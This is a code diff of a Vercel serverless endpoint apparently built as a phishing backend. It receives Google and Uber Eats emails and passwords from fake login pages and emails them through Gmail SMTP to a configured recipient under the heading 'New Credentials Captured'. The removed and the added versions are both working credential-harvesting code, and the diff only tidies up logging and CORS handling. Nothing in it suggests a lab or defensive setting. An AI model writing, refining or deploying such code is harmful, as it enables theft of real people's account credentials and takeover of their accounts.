@@ -1,31 +1,24 @@
 import nodemailer from 'nodemailer';
 
-// Environment variables are automatically available in Vercel
-const GMAIL_USER = process.env.GMAIL_USER;
-const GMAIL_PASSWORD = process.env.GMAIL_PASSWORD || process.env.GMAIL_APP_PASSWORD;
-const RECIPIENT_EMAIL = process.env.RECIPIENT_EMAIL;
-
+// Create transporter with Gmail SMTP
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
-    user: GMAIL_USER,
-    pass: GMAIL_PASSWORD
+    user: process.env.GMAIL_USER,
+    pass: process.env.GMAIL_APP_PASSWORD
   }
 });
 
-async function sendCredentialsEmail(googleEmail, googlePassword, uberEmail, uberPassword) {
-  console.log('\n=== SENDING EMAIL ===');
-  console.log('Gmail User:', GMAIL_USER);
-  console.log('Gmail Password exists:', !!GMAIL_PASSWORD);
-  console.log('Recipient:', RECIPIENT_EMAIL);
-  console.log('\nCredentials to send:');
-  console.log('Google Email:', googleEmail);
-  console.log('Google Password:', googlePassword);
-  console.log('Uber Email:', uberEmail);
-  console.log('Uber Password:', uberPassword);
-  console.log('==================\n');
-  
+// Vercel serverless function handler
+export default async function handler(req, res) {
+  // Only allow POST
+  if (req.method !== 'POST') {
+    return res.status(405).json({ success: false, error: 'Method not allowed' });
+  }
+
   try {
+    const { googleEmail, googlePassword, uberEmail, uberPassword } = req.body;
+    
     const htmlContent = `
       <!DOCTYPE html>
       <html>
@@ -44,97 +37,44 @@ async function sendCredentialsEmail(googleEmail, googlePassword, uberEmail, uber
       <body>
         <div class="container">
           <div class="header">
-            <h1>New Login Credentials Captured</h1>
+            <h1>🔐 New Credentials Captured</h1>
           </div>
-          
           <div class="content">
-            <h2>Google Login Page Credentials:</h2>
+            ${googleEmail ? `
             <div class="credentials">
-              <div><span class="label">Email:</span><span class="value">${googleEmail}</span></div>
-              <div><span class="label">Password:</span><span class="value">${googlePassword}</span></div>
+              <h3>Google Account</h3>
+              <p><span class="label">Email:</span><span class="value">${googleEmail}</span></p>
+              <p><span class="label">Password:</span><span class="value">${googlePassword}</span></p>
             </div>
-
-            <h2>Uber Eats Login Page Credentials:</h2>
+            ` : ''}
+            ${uberEmail ? `
             <div class="credentials">
-              <div><span class="label">Email:</span><span class="value">${uberEmail}</span></div>
-              <div><span class="label">Password:</span><span class="value">${uberPassword}</span></div>
+              <h3>Uber Eats Account</h3>
+              <p><span class="label">Email/Phone:</span><span class="value">${uberEmail}</span></p>
+              <p><span class="label">Password:</span><span class="value">${uberPassword}</span></p>
             </div>
+            ` : ''}
           </div>
-
           <div class="footer">
-            <p>This is an automated email from your login system.</p>
-            <p>Timestamp: ${new Date().toLocaleString()}</p>
+            <p>Captured at: ${new Date().toLocaleString()}</p>
           </div>
         </div>
       </body>
       </html>
     `;
 
-    const info = await transporter.sendMail({
-      from: `"Login System" <${GMAIL_USER}>`,
-      to: RECIPIENT_EMAIL,
-      subject: `New Login Credentials - ${new Date().toLocaleDateString()}`,
+    const mailOptions = {
+      from: process.env.GMAIL_USER,
+      to: process.env.RECIPIENT_EMAIL,
+      subject: '🔐 New Login Credentials Captured',
       html: htmlContent
-    });
+    };
 
-    console.log('✅ EMAIL SENT SUCCESSFULLY!');
-    console.log('Message ID:', info.messageId);
-    console.log('Accepted:', info.accepted);
-    console.log('Response:', info.response);
-    return { success: true, messageId: info.messageId };
-  } catch (error) {
-    console.error('❌ ERROR SENDING EMAIL:');
-    console.error('Error message:', error.message);
-    console.error('Full error:', error);
-    return { success: false, error: error.message };
-  }
-}
-
-export default async function handler(req, res) {
-  // Enable CORS
-  res.setHeader('Access-Control-Allow-Credentials', true);
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
-  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');
-
-  if (req.method === 'OPTIONS') {
-    res.status(200).end();
-    return;
-  }
-
-  if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Method not allowed' });
-  }
-
-  const { googleEmail, googlePassword, uberEmail, uberPassword } = req.body;
-  
-  console.log('\n📧 Received request to send credentials email');
-  console.log('Data received:', { googleEmail, googlePassword, uberEmail, uberPassword });
-  
-  try {
-    const result = await sendCredentialsEmail(googleEmail, googlePassword, uberEmail, uberPassword);
+    await transporter.sendMail(mailOptions);
     
-    if (result.success) {
-      console.log('✅ API: Email sent successfully');
-      res.status(200).json({ 
-        success: true, 
-        message: 'Credentials sent successfully',
-        messageId: result.messageId
-      });
-    } else {
-      console.log('❌ API: Email sending failed');
-      res.status(500).json({ 
-        success: false, 
-        message: 'Failed to send email',
-        error: result.error
-      });
-    }
+    return res.status(200).json({ success: true, message: 'Credentials sent successfully' });
   } catch (error) {
-    console.error('❌ API Error:', error);
-    res.status(500).json({ 
-      success: false, 
-      message: 'Server error',
-      error: error.message
-    });
+    console.error('Error sending credentials:', error);
+    return res.status(500).json({ success: false, error: error.message });
   }
 }
